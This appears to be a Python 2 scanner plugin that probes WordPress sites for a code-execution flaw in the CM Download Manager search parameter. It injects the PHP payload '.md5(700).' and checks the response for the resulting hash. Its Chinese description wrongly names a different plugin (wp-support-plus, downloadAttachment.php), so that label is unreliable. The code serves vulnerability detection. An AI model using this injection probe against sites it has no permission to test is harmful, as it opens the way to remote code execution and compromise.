# coding:utf-8
# author:taro

import requests
def get_plugin_info():
    plugin_info = {
        "name": "Wordpress cmdownloads RCE",
        "info": "WordPress wp-support-plus-responsive-ticket-system plugin downloadAttachment.php 存在代码执行漏洞",
        "level": "高危",
        "type": "代码执行",
        "author": "taro",
        "url": "",
        "keyword": "target:wordpress",
    }
    return plugin_info

def check(host, port, timeout):
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/cmdownloads/?CMDsearch=\".md5(700).\"'
    url = u + payload_url
    try:
        res = requests.get(url, timeout=timeout)
        if 'e5841df2166dd424a57127423d276bbe' in res.text:
            info = '存在代码执行漏洞: %s' % payload_url
            print info
            return info
    except Exception, e:
        pass
